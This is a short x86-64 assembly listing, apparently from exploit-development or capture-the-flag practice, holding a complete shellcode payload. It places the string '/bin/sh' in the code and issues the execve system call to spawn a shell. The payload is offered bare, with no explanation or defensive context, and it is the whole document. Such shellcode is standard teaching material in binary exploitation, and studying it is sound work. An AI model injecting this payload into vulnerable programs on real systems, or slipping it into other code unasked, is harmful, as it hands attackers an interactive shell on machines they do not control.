global _start

section .text:

_start:
	call get_shell
	db '/bin/sh', 00 ; 參數

get_shell:
    mov rax, 59 ; rax = sys_execve
    mov rdi, [rsp] ; rdi = path
    mov rsi, 0 ; argv = NULL
    mov rdx, 0 ; envp[] = NULL
	syscall
